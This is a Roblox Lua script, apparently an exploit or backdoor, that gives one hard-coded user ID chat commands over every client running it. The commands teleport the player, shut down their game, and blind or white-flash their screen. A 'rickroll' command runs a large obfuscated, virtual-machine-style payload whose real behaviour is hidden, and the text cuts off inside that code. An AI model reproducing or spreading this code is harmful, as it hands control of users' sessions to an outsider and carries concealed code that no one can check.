
local whitelist = {
	owner = {
	1316147591
	},
	admin = {
	-- user
	},

}


owner = false
admin = false

local function runcommand(message,author) 
	owner = false
	admin = false
	local player = game.Players[author]
	local mod = author.Name
	for i ,_ in pairs(whitelist.admin) do
		if player.UserId == _ then
			admin = true 
		end  
	end
	for i ,_ in pairs(whitelist.owner) do
		if player.UserId == _ then
			owner = true 
		end  
	end


	if admin or owner then
		if message:sub(1, 8) == "cc!bring" then
			if message:match(game.Players.LocalPlayer.Name) then
				local plr = game.Players.LocalPlayer
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
			end
		end

		if message:sub(1, 11) == "cc!shutdown" then
			if message:match(game.Players.LocalPlayer.Name) then
				game:Shutdown()
			end
		end

		if message:sub(1, 8) == "cc!blind" then
			if message:match(game.Players.LocalPlayer.Name) then
				game:GetService("StarterGui").MainScreenGui.PepperSpray.Visible = true
				game:GetService("Lighting").PepperSprayBlur.Visible = true
			end
		end

		if message:sub(1, 10) == "cc!unblind" then
			if message:match(game.Players.LocalPlayer.Name) then
				game:GetService("StarterGui").MainScreenGui.PepperSpray.Visible = false
				game:GetService("Lighting").PepperSprayBlur.Visible = false
			end
		end

		if message:sub(1, 8) == "cc!flash" then
			if message:match(game.Players.LocalPlayer.Name) then
				game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.whiteScreen.Visible = true
			end
		end

		if message:sub(1, 10) == "cc!unflash" then
			if message:match(game.Players.LocalPlayer.Name) then
				game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.whiteScreen.Visible = false
			end
		end

		if message:sub(1, 11) == "cc!rickroll" then
			if message:match(game.Players.LocalPlayer.Name) then
				return(function(new_IIIIllIllIIIlIIIlIIIIll,new_IllIIlllIlIllIllIl,new_IllIIlllIlIllIllIl)local new_llllllllIllllIlllII=string.char;local new_IIlIlIlllIIIIIllIl=string.sub;local new_IIIIllIlIIlIIIIIlII=table.concat;local new_IIIlIllllIIIllIllll=math.ldexp;local new_IllllIllIllIIlIll=getfenv or function()return _ENV end;local new_llIIlllIlIlIIIlllIIllIIll=select;local new_IllIlIIlIlIIllllIIIlIII=unpack or table.unpack;local new_lIlllIIlllIIIIlIII=tonumber;local function new_lIlIlIIIllIlIIlIllI(new_IllIlIIIlIII)local new_IlIIIlIlllIlIllIlIIII,new_IlIllllIIIIlIIIIIIlI,new_IlIllllIlIllIIIlIIllIllI="","",{}local new_IIlIIIlIllIIlll=256;local new_IllIlIIlIlIIllllIIIlIII={}for new_IllIIlllIlIllIllIl=0,new_IIlIIIlIllIIlll-1 do new_IllIlIIlIlIIllllIIIlIII[new_IllIIlllIlIllIllIl]=new_llllllllIllllIlllII(new_IllIIlllIlIllIllIl)end;local new_IllIIlllIlIllIllIl=1;local function new_IIIIllIllIIIlIIIlIIIIll()local new_IlIIIlIlllIlIllIlIIII=new_lIlllIIlllIIIIlIII(new_IIlIlIlllIIIIIllIl(new_IllIlIIIlIII,new_IllIIlllIlIllIllIl,new_IllIIlllIlIllIllIl),36)new_IllIIlllIlIllIllIl=new_IllIIlllIlIllIllIl+1;local new_IlIllllIIIIlIIIIIIlI=new_lIlllIIlllIIIIlIII(new_IIlIlIlllIIIIIllIl(new_IllIlIIIlIII,new_IllIIlllIlIllIllIl,new_IllIIlllIlIllIllIl+new_IlIIIlIlllIlIllIlIIII-1),36)new_IllIIlllIlIllIllIl=new_IllIIlllIlIllIllIl+new_IlIIIlIlllIlIllIlIIII;return new_IlIllllIIIIlIIIIIIlI end;new_IlIIIlIlllIlIllIlIIII=new_llllllllIllllIlllII(new_IIIIllIllIIIlIIIlIIIIll())new_IlIllllIlIllIIIlIIllIllI[1]=new_IlIIIlIlllIlIllIlIIII;while new_IllIIlllIlIllIllIl<#new_IllIlIIIlIII do local new_IllIIlllIlIllIllIl=new_IIIIllIllIIIlIIIlIIIIll()if new_IllIlIIlIlIIllllIIIlIII[new_IllIIlllIlIllIllIl]then new_IlIllllIIIIlIIIIIIlI=new_IllIlIIlIlIIllllIIIlIII[new_IllIIlllIlIllIllIl]else new_IlIllllIIIIlIIIIIIlI=new_IlIIIlIlllIlIllIlIIII..new_IIlIlIlllIIIIIllIl(new_IlIIIlIlllIlIllIlIIII,1,1)end;new_IllIlIIlIlIIllllIIIlIII[new_IIlIIIlIllIIlll]=new_IlIIIlIlllIlIllIlIIII..new_IIlIlIlllIIIIIllIl(new_IlIllllIIIIlIIIIIIlI,1,1)new_IlIllllIlIllIIIlIIllIllI[#new_IlIllllIlIllIIIlIIllIllI+1],new_IlIIIlIlllIlIllIlIIII,new_IIlIIIlIllIIlll=new_IlIllllIIIIlIIIIIIlI,new_IlIllllIIIIlIIIIIIlI,new_IIlIIIlIllIIlll+1 end;return table.concat(new_IlIllllIlIllIIIlIIllIllI)end;local new_lIlllIIlllIIIIlIII=new_lIlIlIIIllIlIIlIllI('22A22727522621Z275227161X21O21N21A1X2182162262242791X21621K22621Y2791S21821P2162161X1821M21222622327921421A1Y27I21X2791821621N1S21621P21L21227H2262202791C1W27U27Y280288275161Y21A2142161321A2192161Z2812791128527I27827521P28H21021P1W1Z29222N2791D21A21821021429D21M1X21728M1Z28N23G22622128L29E29U28J27921529D1Y1T181D27K27922724V1W1F2932751S21221H27I2222791Q1B2121Y23H2A92AA2752AS27521F2621F2AV22723J25L2AE2AL28S28U28W22622J27921P21921J21A21O21O28B21221723922O22O23E23C23D2BQ23E23B2262B52271S1W29P21727P27921K28N21021O21R29K27I28K2AG2BY29Q162C022G2BB2BD2BF2BH21N2BJ2BL22O23F2BQ23H23F23E23H23E23I23E2A12751V1Z21A21I2121X21422722629W279131W1W21R2162C029X2751P29E21M2862B022722Z1F22722V27922L22F2792262792332AT22722522722L2762272AS2E42E12272822752DZ2E92E22AL2E82822DH2AA2E22EB2E02752E22E82DX2DX2EC2E52DX2EP2E22E22CA2752882DN2E527K2E223J2AA27827Q2E82E221W2DY2EO2E921V2E32AU22721U2DT2752822FK2752E82AL2FO2EK2272AL2E229H2D72272882EP21T2E921S2DY2BA2EX2E92E827K2FX2FH2EA22722M2FL2FU2272GB2E829X2E82FT29X2FW2E52G22F52E522K2272BA2FA2FY2ET2EE2G82E227K22I2DT2CG28222H2E02EL2E92F62E92CG2DV2HC2E222E22722D2B12FE22C2HJ2HL2E922B2272742AT2ES2AT');local new_IllIIlllIlIllIllIl=(bit or bit32);local new_IlIllllIlIllIIIlIIllIllI=new_IllIIlllIlIllIllIl and new_IllIIlllIlIllIllIl.bxor or function(new_IllIIlllIlIllIllIl,new_IlIllllIIIIlIIIIIIlI)local new_IlIIIlIlllIlIllIlIIII,new_IlIllllIlIllIIIlIIllIllI,new_IIlIlIlllIIIIIllIl=1,0,10 while new_IllIIlllIlIllIllIl>0 and new_IlIllllIIIIlIIIIIIlI>0 do local new_IllIlIIlIlIIllllIIIlIII,new_IIlIlIlllIIIIIllIl=new_IllIIlllIlIllIllIl%2,new_IlIllllIIIIlIIIIIIlI%2 if new_IllIlIIlIlIIllllIIIlIII~=new_IIlIlIlllIIIIIllIl then new_IlIllllIlIllIIIlIIllIllI=new_IlIllllIlIllIIIlIIllIllI+new_IlIIIlIlllIlIllIlIIII end new_IllIIlllIlIllIllIl,new_IlIllllIIIIlIIIIIIlI,new_IlIIIlIlllIlIllIlIIII=(new_IllIIlllIlIllIllIl-new_IllIlIIlIlIIllllIIIlIII)/2,(new_IlIllllIIIIlIIIIIIlI-new_IIlIlIlllIIIIIllIl)/2,new_IlIIIlIlllIlIllIlIIII*2 end if new_IllIIlllIlIllIllIl<new_IlIllllIIIIlIIIIIIlI then new_IllIIlllIlIllIllIl=new_IlIllllIIIIlIIIIIIlI end while new_IllIIlllIlIllIllIl>0 do local new_IlIllllIIIIlIIIIIIlI=new_IllIIlllIlIllIllIl%2 if new_IlIllllIIIIlIIIIIIlI>0 then new_IlIllllIlIllIIIlIIllIllI=new_IlIllllIlIllIIIlIIllIllI+new_IlIIIlIlllIlIllIlIIII end new_IllIIlllIlIllIllIl,new_IlIIIlIlllIlIllIlIIII=(new_IllIIlllIlIllIllIl-new_IlIllllIIIIlIIIIIIlI)/2,new_IlIIIlIlllIlIllIlIIII*2 end return new_IlIllllIlIllIIIlIIllIllI end local function new_IlIllllIIIIlIIIIIIlI(new_IlIIIlIlllIlIllIlIIII,new_IllIIlllIlIllIllIl,new_IlIllllIIIIlIIIIIIlI)if new_IlIllllIIIIlIIIIIIlI then local new_IllIIlllIlIllIllIl=(new_IlIIIlIlllIlIllIlIIII/2^(new_IllIIlllIlIllIllIl-1))%2^((new_IlIllllIIIIlIIIIIIlI-1)-(new_IllIIlllIlIllIllIl-1)+1);return new_IllIIlllIlIllIllIl-new_IllIIlllIlIllIllIl%1;else local new_IllIIlllIlIllIllIl=2^(new_IllIIlllIlIllIllIl-1);return(new_IlIIIlIlllIlIllIlIIII%(new_IllIIlllIlIllIllIl+new_IllIIlllIlIllIllIl)>=new_IllIIlllIlIllIllIl)and 1 or 0;end;end;local new_IllIIlllIlIllIllIl=1;local function new_IlIIIlIlllIlIllIlIIII()local new_IIlIlIlllIIIIIllIl,new_IllIlIIlIlIIllllIIIlIII,new_IlIIIlIlllIlIllIlIIII,new_IlIllllIIIIlIIIIIIlI=new_IIIIllIllIIIlIIIlIIIIll(new_lIlllIIlllIIIIlIII,new_IllIIlllIlIllIllIl,new_IllIIlllIlIllIllIl+3);new_IIlIlIlllIIIIIllIl=new_IlIllllIlIllIIIlIIllIllI(new_IIlIlIlllIIIIIllIl,79)new_IllIlIIlIlIIllllIIIlIII=new_IlIllllIlIllIIIlIIllIllI(new_IllIlIIlIlIIllllIIIlIII,79)new_IlIIIlIlllIlIllIlIIII=new_IlIllllIlIllIIIlIIllIllI(new_IlIIIlIlllIlIllIlIIII,79)new_IlIllllIIIIlIIIIIIlI=new_IlIllllIlIllIIIlIIllIllI(new_IlIllllIIIIlIIIIIIlI,79)new_IllIIlllIlIllIllIl=new_IllIIlllIlIllIllIl+4;return(new_IlIllllIIIIlIIIIIIlI*16777216)+(new_IlIIIlIlllIlIllIlIIII*65536)+(new_IllIlIIlIlIIllllIIIlIII*256)+new_IIlIlIlllIIIIIllIl;end;local function new_IllIlIIIlIII()local new_IlIIIlIlllIlIllIlIIII=new_IlIllllIlIllIIIlIIllIllI(new_IIIIllIllIIIlIIIlIIIIll(new_lIlllIIlllIIIIlIII,new_IllIIlllIlIllIllIl,new_IllIIlllIlIllIllIl),79);new_IllIIlllIlIllIllIl=new_IllIIlllIlIllIllIl+1;return new_IlIIIlIlllIlIllIlIIII;end;local function new_IIlIIIlIllIIlll()local new_IlIllllIIIIlIIIIIIlI,new_IlIIIlIlllIlIllIlIIII=new_IIIIllIllIIIlIIIlIIIIll(new_lIlllIIlllIIIIlIII,new_IllIIlllIlIllIllIl,new_IllIIlllIlIllIllIl+2);new_IlIllllIIIIlIIIIIIlI=new_IlIllllIlIllIIIlIIllIllI(new_IlIllllIIIIlIIIIIIlI,79)new_IlIIIlIlllIlIllIlIIII=new_IlIllllIlIllIIIlIIllIllI(new_IlIIIlIlllIlIllIlIIII,79)new_IllIIlllIlIllIllIl=new_IllIIlllIlIllIllIl+2;return(new_IlIIIlIlllIlIllIlIIII*256)+new_IlIllllIIIIlIIIIIIlI;end;local function new_lIlIlIIIllIlIIlIllI()local new_IlIllllIlIllIIIlIIllIllI=new_IlIIIlIlllIlIllIlIIII();local new_IllIIlllIlIllIllIl=new_IlIIIlIlllIlIllIlIIII();local new_IIlIlIlllIIIIIllIl=1;local new_IlIllllIlIllIIIlIIllIllI=(new_IlIllllIIIIlIIIIIIlI(new_IllIIlllIlIllIllIl,1,20)*(2^32))+new_IlIllllIlIllIIIlIIllIllI;local new_IlIIIlIlllIlIllIlIIII=new_IlIllllIIIIlIIIIIIlI(new_IllIIlllIlIllIllIl,21,31);local new_IllIIlllIlIllIllIl=((-1)^new_IlIllllIIIIlIIIIIIlI(new_IllIIlllIlIllIllIl,32));if(new_IlIIIlIlllIlIllIlIIII==0)then if(new_IlIllllIlIllIIIlIIllIllI==0)then return new_IllIIlllIlIllIllIl*0;else new_IlIIIlIlllIlIllIlIIII=1;new_IIlIlIlllIIIIIllIl=0;end;elseif(new_IlIIIlIlllIlIllIlIIII==2047)then return(new_IlIllllIlIllIIIlIIllIllI==0)and(new_IllIIlllIlIllIllIl*(1/0))or(new_IllIIlllIlIllIllIl*(0/0));end;return new_IIIlIllllIIIllIllll(new_IllIIlllIlIllIllIl,new_IlIIIlIlllIlIllIlIIII-1023)*(new_IIlIlIlllIIIIIllIl+(new_IlIllllIlIllIIIlIIllIllI/(2^52)));end;local new_Illlllll=new_IlIIIlIlllIlIllIlIIII;local function new_IIIlIllllIIIllIllll(new_IlIIIlIlllIlIllIlIIII)local new_IlIllllIIIIlIIIIIIlI;if(not new_IlIIIlIlllIlIllIlIIII)then new_IlIIIlIlllIlIllIlIIII=new_Illlllll();if(new_IlIIIlIlllIlIllIlIIII==0)then return'';end;end;new_IlIllllIIIIlIIIIIIlI=new_IIlIlIlllIIIIIllIl(new_lIlllIIlllIIIIlIII,new_IllIIlllIlIllIllIl,new_IllIIlllIlIllIllIl+new_IlIIIlIlllIlIllIlIIII-1);new_IllIIlllIlIllIllIl=new_IllIIlllIlIllIllIl+new_IlIIIlIlllIlIllIlIIII;local new_IlIIIlIlllIlIllIlIIII={}for new_IllIIlllIlIllIllIl=1,#new_IlIllllIIIIlIIIIIIlI do new_IlIIIlIlllIlIllIlIIII[new_IllIIlllIlIllIllIl]=new_llllllllIllllIlllII(new_IlIllllIlIllIIIlIIllIllI(new_IIIIllIllIIIlIIIlIIIIll(new_IIlIlIlllIIIIIllIl(new_IlIllllIIIIlIIIIIIlI,new_IllIIlllIlIllIllIl,new_IllIIlllIlIllIllIl)),79))end return new_IIIIllIlIIlIIIIIlII(new_IlIIIlIlllIlIllIlIIII);end;local new_IllIIlllIlIllIllIl=new_IlIIIlIlllIlIllIlIIII;local function new_Illlllll(...)return{...},new_llIIlllIlIlIIIlllIIllIIll('#',...)end local function new_llllllllIllllIlllII()local new_llIIlllIlIlIIIlllIIllIIll={};local new_lIlllIIlllIIIIlIII={};local new_IllIIlllIlIllIllIl={};local new_IIIIllIllIIIlIIIlIIIIll={[#{{294;243;590;992};{332;957;100;785};}]=new_lIlllIIlllIIIIlIII,[#{{548;773;809;936};"1 + 1 = 111";"1 + 1 = 111";}]=nil,[#{"1 + 1 = 111";{700;808;208;757};"1 + 1 = 111";"1 + 1 = 111";}]=new_IllIIlllIlIllIllIl,[#{"1 + 1 = 111";}]=new_llIIlllIlIlIIIlllIIllIIll,};local new_IllIIlllIlIllIllIl=new_IlIIIlIlllIlIllIlIIII()local new_IIlIlIlllIIIIIllIl={}for new_IlIllllIIIIlIIIIIIlI=1,new_IllIIlllIlIllIllIl do local new_IlIIIlIlllIlIllIlIIII=new_IllIlIIIlIII();local new_IllIIlllIlIllIllIl;if(new_IlIIIlIlllIlIllIlIIII==0)then new_IllIIlllIlIllIllIl=(new_IllIlIIIlIII()~=0);elseif(new_IlIIIlIlllIlIllIlIIII==3)then new_IllIIlllIlIllIllIl=new_lIlIlIIIllIlIIlIllI();elseif(new_IlIIIlIlllIlIllIlIIII==1)then new_IllIIlllIlIllIllIl=new_IIIlIllllIIIllIllll();end;new_IIlIlIlllIIIIIllIl[new_IlIllllIIIIlIIIIIIlI]=new_IllIIlllIlIllIllIl;end;new_IIIIllIllIIIlIIIlIIIIll[3]=new_IllIlIIIlIII();for new_IIIIllIllIIIlIIIlIIIIll=1,new_IlIIIlIlllIlIllIlIIII()do local new_IllIIlllIlIllIllIl=new_IllIlIIIlIII();if(new_IlIllllIIIIlIIIIIIlI(new_IllIIlllIlIllIllIl,1,1)==0)then local new_IlIllllIlIllIIIlIIllIllI=new_IlIllllIIIIlIIIIIIlI(new_IllIIlllIlIllIllIl,2,3);local new_IllIlIIlIlIIllllIIIlIII=new_IlIllllIIIIlIIIIIIlI(new_IllIIlllIlIllIllIl,4,6);local new_IllIIlllIlIllIllIl={new_IIlIIIlIllIIlll(),new_IIlIIIlIllIIlll(),nil,nil};if(new_IlIllllIlIllIIIlIIllIllI==0)then new_IllIIlllIlIllIllIl[#("uU1")]=new_IIlIIIlIllIIlll();new_IllIIlllIlIllIllIl[#("I3ln")]=new_IIlIIIlIllIIlll();elseif(new_IlIllllIlIllIIIlIIllIllI==1)then new_IllIIlllIlIllIllIl[#("bk5")]=new_IlIIIlIlllIlIllIlIIII();elseif(new_IlIllllIlIllIIIlIIllIllI==2)then new_IllIIlllIlIllIllIl[#("CCz")]=new_IlIIIlIlllIlIllIlIIII()-(2^16)elseif(new_IlIllllIlIllIIIlIIllIllI==3)then new_IllIIlllIlIllIllIl[#("ShH")]=new_IlIIIlIlllIlIllIlIIII()-(2^16)new_IllIIlllIlIllIllIl[#("JQW3")]=new_IIlIIIlIllIIlll();end;if(new_IlIllllIIIIlIIIIIIlI(new_IllIlIIlIlIIllllIIIlIII,1,1)==1)then new_IllIIlllIlIllIllIl[#("5V")]=new_IIlIlIlllIIIIIllIl[new_IllIIlllIlIllIllIl[#("BG")]]end if(new_IlIllllIIIIlIIIIIIlI(new_IllIlIIlIlIIllllIIIlIII,2,2)==1)then new_IllIIlllIlIllIllIl[#("dH4")]=new_IIlIlIlllIIIIIllIl[new_IllIIlllIlIllIllIl[#("rdl")]]end if(new_IlIllllIIIIlIIIIIIlI(new_IllIlIIlIlIIllllIIIlIII,3,3)==1)then new_IllIIlllIlIllIllIl[#("kv5A")]=new_IIlIlIlllIIIIIllIl[new_IllIIlllIlIllIllIl[#("xe0L")]]end new_llIIlllIlIlIIIlllIIllIIll[new_IIIIllIllIIIlIIIlIIIIll]=new_IllIIlllIlIllIllIl;end end;for new_IllIIlllIlIllIllIl=1,new_IlIIIlIlllIlIllIlIIII()do new_lIlllIIlllIIIIlIII[new_IllIIlllIlIllIllIl-1]=new_llllllllIllllIlllII();end;return new_IIIIllIllIIIlIIIlIIIIll;end;local function new_IIIlIllllIIIllIllll(new_IllIIlllIlIllIllIl,new_IlIIIlIlllIlIllIlIIII,new_IllIlIIIlIII)new_IllIIlllIlIllIllIl=(new_IllIIlllIlIllIllIl==true and new_llllllllIllllIlllII())or new_IllIIlllIlIllIllIl;return(function(...)local new_IlIllllIlIllIIIlIIllIllI=new_IllIIlllIlIllIllIl[1];local new_IIlIlIlllIIIIIllIl=new_IllIIlllIlIllIllIl[3];local new_IllIIlllIlIllIllIl=new_IllIIlllIlIllIllIl[2];local new_llllllllIllllIlllII=new_Illlllll local new_IlIIIlIlllIlIllIlIIII=1;local new_IIlIIIlIllIIlll=-1;local new_lIlIlIIIllIlIIlIllI={};local new_IIIIllIllIIIlIIIlIIIIll={...};local new_lIlllIIlllIIIIlIII=new_llIIlllIlIlIIIlllIIllIIll('#',...)-1;local new_IllIIlllIlIllIllIl={};local new_IlIllllIIIIlIIIIIIlI={};for new_IllIIlllIlIllIllIl=0,new_lIlllIIlllIIIIlIII do if(new_IllIIlllIlIllIllIl>=new_IIlIlIlllIIIIIllIl)then new_lIlIlIIIllIlIIlIllI[new_IllIIlllIlIllIllIl-new_IIlIlIlllIIIIIllIl]=new_IIIIllIllIIIlIIIlIIIIll[new_IllIIlllIlIllIllIl+1];else new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl]=new_IIIIllIllIIIlIIIlIIIIll[new_IllIIlllIlIllIllIl+#{{311;373;604;964};}];end;end;local new_IllIIlllIlIllIllIl=new_lIlllIIlllIIIIlIII-new_IIlIlIlllIIIIIllIl+1 local new_IllIIlllIlIllIllIl;local new_IIlIlIlllIIIIIllIl;while true do new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IIlIlIlllIIIIIllIl=new_IllIIlllIlIllIllIl[#("P")];if new_IIlIlIlllIIIIIllIl<=#("x5HoznD6QVU1")then if new_IIlIlIlllIIIIIllIl<=#("lcPAD")then if new_IIlIlIlllIIIIIllIl<=#("db")then if new_IIlIlIlllIIIIIllIl<=#("")then new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("Kz")]]=new_IllIIlllIlIllIllIl[#("cxY")];elseif new_IIlIlIlllIIIIIllIl>#("d")then new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("rF")]]=new_IllIIlllIlIllIllIl[#("TAj")];else new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("VH")]]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("ElO")]][new_IllIIlllIlIllIllIl[#("KqiB")]];end;elseif new_IIlIlIlllIIIIIllIl<=#("5vL")then new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("uZ")]]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("iFq")]];elseif new_IIlIlIlllIIIIIllIl==#("5xeE")then new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("2E")]][new_IllIIlllIlIllIllIl[#{{525;111;766;49};{742;869;750;37};"1 + 1 = 111";}]]=new_IllIIlllIlIllIllIl[#("Jr05")];else do return end;end;elseif new_IIlIlIlllIIIIIllIl<=#("ZiXUkgnQ")then if new_IIlIlIlllIIIIIllIl<=#("DRdpCD")then new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("OX")]][new_IllIIlllIlIllIllIl[#("res")]]=new_IllIIlllIlIllIllIl[#("kbrr")];elseif new_IIlIlIlllIIIIIllIl==#("cZH2vjp")then local new_IllIIlllIlIllIllIl=new_IllIIlllIlIllIllIl[#("bo")]new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl](new_IllIlIIlIlIIllllIIIlIII(new_IlIllllIIIIlIIIIIIlI,new_IllIIlllIlIllIllIl+1,new_IIlIIIlIllIIlll))else local new_IlIIIlIlllIlIllIlIIII=new_IllIIlllIlIllIllIl[#{{116;213;167;12};"1 + 1 = 111";}];local new_IlIllllIlIllIIIlIIllIllI=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("j2n")]];new_IlIllllIIIIlIIIIIIlI[new_IlIIIlIlllIlIllIlIIII+1]=new_IlIllllIlIllIIIlIIllIllI;new_IlIllllIIIIlIIIIIIlI[new_IlIIIlIlllIlIllIlIIII]=new_IlIllllIlIllIIIlIIllIllI[new_IllIIlllIlIllIllIl[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{150;285;955;601};}]];end;elseif new_IIlIlIlllIIIIIllIl<=#("sE12iUyQxZ")then if new_IIlIlIlllIIIIIllIl>#("31Qsr0uUm")then local new_IIlIlIlllIIIIIllIl;new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("Cb")]]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("02Z")]];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IIlIlIlllIIIIIllIl=new_IllIIlllIlIllIllIl[#("BS")]new_IlIllllIIIIlIIIIIIlI[new_IIlIlIlllIIIIIllIl]=new_IlIllllIIIIlIIIIIIlI[new_IIlIlIlllIIIIIllIl](new_IllIlIIlIlIIllllIIIlIII(new_IlIllllIIIIlIIIIIIlI,new_IIlIlIlllIIIIIllIl+1,new_IllIIlllIlIllIllIl[#("IPf")]))new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("qQ")]][new_IllIIlllIlIllIllIl[#("vD6")]]=new_IllIIlllIlIllIllIl[#("Jfjn")];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("tP")]]=new_IllIlIIIlIII[new_IllIIlllIlIllIllIl[#{"1 + 1 = 111";{243;813;31;458};"1 + 1 = 111";}]];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#{"1 + 1 = 111";"1 + 1 = 111";}]]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("DQD")]][new_IllIIlllIlIllIllIl[#("qRXF")]];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("R6")]]=new_IllIIlllIlIllIllIl[#("p2V")];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("A6")]]=new_IllIIlllIlIllIllIl[#("B04")];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("fr")]]=new_IllIIlllIlIllIllIl[#("dMs")];new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IIlIlIlllIIIIIllIl=new_IllIIlllIlIllIllIl[#("er")]new_IlIllllIIIIlIIIIIIlI[new_IIlIlIlllIIIIIllIl]=new_IlIllllIIIIlIIIIIIlI[new_IIlIlIlllIIIIIllIl](new_IllIlIIlIlIIllllIIIlIII(new_IlIllllIIIIlIIIIIIlI,new_IIlIlIlllIIIIIllIl+1,new_IllIIlllIlIllIllIl[#("mxP")]))new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII+1;new_IllIIlllIlIllIllIl=new_IlIllllIlIllIIIlIIllIllI[new_IlIIIlIlllIlIllIlIIII];new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("rz")]][new_IllIIlllIlIllIllIl[#("vxs")]]=new_IlIllllIIIIlIIIIIIlI[new_IllIIlllIlIllIllIl[#("xuCN")]];else local new_IlIIIlIlllIlIllIlIIII=new_IllIIlllIlIllIllIl[#("RG")]local new_IlIllllIlIllIIIlIIllIllI,new_IllIIlllIlIllIllIl=new_llllllllIllllIlllII(new_IlIllllIIIIlIIIIIIlI[new_IlIIIlIlllIlIllIlIIII](new_IllIlIIlIlIIllllIIIlIII(new_IlIllllIIIIlIIIIIIlI,new_IlIIIlIlllIlIllIlIIII+1,new_IllIIlllIlIllIllIl[#("AMQ")])))new_IIlIIIlIllIIlll=new_IllIIlllIlIllIllIl+new_IlIIIlIlllIlIllIlIIII-1 local new_IllIIlllIlIllIllIl=0;for new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII,new_IIlIIIlIllIIlll do new_IllIIlllIlIllIllIl=new_IllIIlllIlIllIllIl+1;new_IlIllllIIIIlIIIIIIlI[new_IlIIIlIlllIlIllIlIIII]=new_IlIllllIlIllIIIlIIllIllI[new_IllIIlllIlIllIllIl];end;end;elseif new_IIlIlIlllIIIIIllIl>#("2P4h43HHM7P")then local new_IlIIIlIlllIlIllIlIIII=new_IllIIlllIlIllIllIl[#("kZ")]new_IlIllllIIIIlIIIIIIlI[new_IlIIIlIlllIlIllIlIIII]=new_IlIllllIIIIlIIIIIIlI[new_IlIIIlIlllIlIllIlIIII](new_IllIlIIlIlIIllllIIIlIII(new_IlIllllIIIIlIIIIIIlI,new_IlIIIlIlllIlIllIlIIII+1,new_IllIIlllIlIllIllIl[#("4Lc")]))else local new_IlIIIlIlllIlIllIlIIII=new_IllIIlllIlIllIllIl[#("8u")]local new_IlIllllIlIllIIIlIIllIllI,new_IllIIlllIlIllIllIl=new_llllllllIllllIlllII(new_IlIllllIIIIlIIIIIIlI[new_IlIIIlIlllIlIllIlIIII](new_IllIlIIlIlIIllllIIIlIII(new_IlIllllIIIIlIIIIIIlI,new_IlIIIlIlllIlIllIlIIII+1,new_IllIIlllIlIllIllIl[#("0VT")])))new_IIlIIIlIllIIlll=new_IllIIlllIlIllIllIl+new_IlIIIlIlllIlIllIlIIII-1 local new_IllIIlllIlIllIllIl=0;for new_IlIIIlIlllIlIllIlIIII=new_IlIIIlIlllIlIllIlIIII,new_IIlIIIlIllIIlll do new_IllIIlllIlIllIllIl=new_IllIIlllIlIllIllIl+1;new_IlIllllIIIIlIIIIIIlI[new_IlIIIlIlllIlIllIlIIII]=new_IlIllllIlIllIIIlIIllIllI[new_IllIIlllIlIllIllIl];end;end;elseif new_IIlIlIlllIIIIIllIl<=#("tBRpuHSebQBfJbxHoc")then if new_IIlIlIlllIIIIIllIl<=#{"1 + 1 = 